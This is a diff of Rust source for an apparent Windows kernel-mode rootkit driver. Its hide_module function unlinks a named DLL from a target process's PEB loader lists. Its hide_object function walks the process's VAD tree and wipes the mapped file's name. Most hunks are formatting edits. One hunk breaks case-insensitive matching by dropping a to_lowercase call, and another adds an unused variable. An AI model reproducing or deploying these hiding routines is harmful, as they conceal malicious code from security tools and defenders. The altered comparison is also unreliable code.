@@ -2,7 +2,10 @@ use {
     wdk_sys::*,
     alloc::vec::Vec,
     winapi::shared::ntdef::LIST_ENTRY,
-    ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB}, 
+    ntapi::{ 
+        ntpebteb::PEB,
+        ntldr::LDR_DATA_TABLE_ENTRY
+    }, 
 };
 
 use crate::{
@@ -27,7 +30,6 @@ pub struct ModuleInfo {
 pub struct Module;
 
 impl Module {
-
     /// VAD Type for an image map.
     const VAD_IMAGE_MAP: u32 = 2;
 
@@ -41,7 +43,7 @@ impl Module {
     ///
     /// # Returns
     /// 
-    /// * `NTSTATUS` - Returns `STATUS_SUCCESS` if the module enumeration is successful, otherwise returns an appropriate error status.
+    /// * Returns `STATUS_SUCCESS` if the module enumeration is successful, otherwise returns an appropriate error status.
     pub unsafe fn enumerate_module(pid: usize) -> Result<Vec<ModuleInfo>, ShadowError> {
         let mut modules: Vec<ModuleInfo> = Vec::with_capacity(276);
 
@@ -112,7 +114,7 @@ impl Module {
     pub unsafe fn hide_module(pid: usize, module_name: &str) -> Result<NTSTATUS, ShadowError> {
         let target = Process::new(pid)?;
         let mut attach_process = ProcessAttach::new(target.e_process);
-
+        
         let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
         if target_peb.is_null() || (*target_peb).Ldr.is_null() {
             return Err(ShadowError::FunctionExecutionFailed("PsGetProcessPeb", line!()));
@@ -121,7 +123,7 @@ impl Module {
         let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
         let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;
         let mut address = core::ptr::null_mut();
-
+        
         while next != current {
             if next.is_null() {
                 return Err(ShadowError::NullPointer("next LIST_ENTRY"));
@@ -131,16 +133,15 @@ impl Module {
             if list_entry.is_null() {
                 return Err(ShadowError::NullPointer("next LDR_DATA_TABLE_ENTRY"));
             }
-
+            
             let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
             if buffer.is_empty() {
                 return Err(ShadowError::StringConversionFailed((*list_entry).FullDllName.Buffer as usize));
             }
-
+            
             // Check if the module name matches
             let dll_name = alloc::string::String::from_utf16_lossy(buffer);
-            if dll_name.to_lowercase() == module_name.to_lowercase() {
-                
+            if dll_name.to_lowercase() == module_name{
                 // Removes the module from the load order list
                 Self::remove_link(&mut (*list_entry).InLoadOrderLinks);
                 Self::remove_link(&mut (*list_entry).InMemoryOrderLinks);
@@ -149,10 +150,10 @@ impl Module {
                 address = (*list_entry).DllBase;
                 break;
             }
-    
+
             next = (*next).Flink;
         }
-    
+
         // Detaches the target process
         attach_process.detach();
 
@@ -176,7 +177,7 @@ impl Module {
     pub unsafe fn hide_object(target_address: u64, process: Process) -> Result<(), NTSTATUS> {
         let vad_root = get_vad_root();
         let vad_table = process.e_process.cast::<u8>().offset(vad_root as isize) as *mut RTL_BALANCED_NODE;
-
+        let current_node = vad_table;
         // Uses a stack to iteratively traverse the tree
         let mut stack = alloc::vec![vad_table];
         while let Some(current_node) = stack.pop() {
@@ -211,7 +212,7 @@ impl Module {
                 core::ptr::write_bytes((*file_object).FileName.Buffer, 0, (*file_object).FileName.Length as usize);
                 break;
             }
-
+            
             // Stack the right node (if there is one)
             if !(*vad_short).VadNode.__bindgen_anon_1.__bindgen_anon_1.Right.is_null() {
                 stack.push((*vad_short).VadNode.__bindgen_anon_1.__bindgen_anon_1.Right);
